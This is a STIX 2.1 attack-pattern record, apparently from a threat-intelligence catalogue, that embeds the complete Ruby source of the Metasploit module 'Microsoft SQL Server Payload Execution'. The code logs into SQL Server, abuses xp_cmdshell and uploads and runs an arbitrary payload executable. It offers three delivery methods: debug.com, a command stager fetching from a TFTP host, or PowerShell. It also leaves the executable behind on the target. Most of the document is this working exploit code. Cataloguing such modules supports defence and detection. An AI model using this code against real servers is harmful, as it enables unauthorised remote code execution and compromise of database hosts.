{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c935b72-370c-4fbb-9bd0-bb922b0b3808",
    "created": "2024-08-14T16:39:51.942991Z",
    "modified": "2024-08-14T16:39:51.942996Z",
    "name": "Microsoft SQL Server Payload Execution",
    "description": " This module executes an arbitrary payload on a Microsoft SQL Server by using the \"xp_cmdshell\" stored procedure. Currently, three delivery methods are supported.  First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.  A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target.  Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the payload on the target.  NOTE: This module will leave a payload executable on the target system when the attack is finished. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/mssql_payload.rb",
            "external_id": "mssql_payload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0402"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-1209"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Exploit::CmdStager\n  #include Msf::Exploit::CmdStagerDebugAsm\n  #include Msf::Exploit::CmdStagerDebugWrite\n  #include Msf::Exploit::CmdStagerTFTP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Payload Execution',\n      'Description'    => %q{\n          This module executes an arbitrary payload on a Microsoft SQL Server by using\n        the \"xp_cmdshell\" stored procedure. Currently, three delivery methods are supported.\n\n        First, the original method uses Windows 'debug.com'. File size restrictions are\n        avoided by incorporating the debug bypass method presented by SecureStat at\n        Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.\n\n        A second method takes advantage of the Command Stager subsystem. This allows using\n        various techniques, such as using a TFTP server, to send the executable. By default\n        the Command Stager uses 'wcsript.exe' to generate the executable on the target.\n\n        Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the\n        payload on the target.\n\n        NOTE: This module will leave a payload executable on the target system when the\n        attack is finished.\n      },\n      'Author'         =>\n        [\n          'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>',  # original module, debug.exe method, powershell method\n          'jduck'  # command stager mods\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # 'sa' password in logs\n          [ 'CVE', '2000-0402' ],\n          [ 'OSVDB', '557' ],\n          [ 'BID', '1281' ],\n\n          # blank default 'sa' password\n          [ 'CVE', '2000-1209' ],\n          [ 'OSVDB', '15757' ],\n          [ 'BID', '4797' ]\n        ],\n      'Platform'       => 'win',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2000-05-30'\n      ))\n    register_options(\n      [\n        OptString.new('METHOD', [ true, 'Which payload delivery method to use (ps, cmd, or old)', 'cmd' ])\n      ])\n  end\n\n  def check\n    if !mssql_login_datastore\n      vprint_status(\"Invalid SQL Server credentials\")\n      return Exploit::CheckCode::Detected\n    end\n\n    mssql_query(\"select @@version\", true)\n    if mssql_is_sysadmin\n      vprint_good \"User #{datastore['USERNAME']} is a sysadmin\"\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  ensure\n    disconnect\n  end\n\n  # This is method required for the CmdStager to work...\n  def execute_command(cmd, opts)\n    mssql_xpcmdshell(cmd, datastore['VERBOSE'])\n  end\n\n  def exploit\n\n    if !mssql_login_datastore\n      print_status(\"Invalid SQL Server credentials\")\n      return\n    end\n\n    method = datastore['METHOD'].downcase\n\n    if (method =~ /^cmd/)\n      tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n      execute_cmdstager({ linemax: 1500, tftphost: tftphost, nodelete: true })\n    else\n      # Generate the EXE, this is the same no matter what delivery mechanism we use\n      exe = generate_payload_exe\n\n      # Use powershell method for payload delivery if specified\n      if (method =~ /^ps/) or (method =~ /^power/)\n        powershell_upload_exec(exe)\n      else\n        # Otherwise, fall back to the old way..\n        mssql_upload_exec(exe, datastore['VERBOSE'])\n      end\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-05-30",
    "x_mitre_platforms": [
        "win'"
    ]
}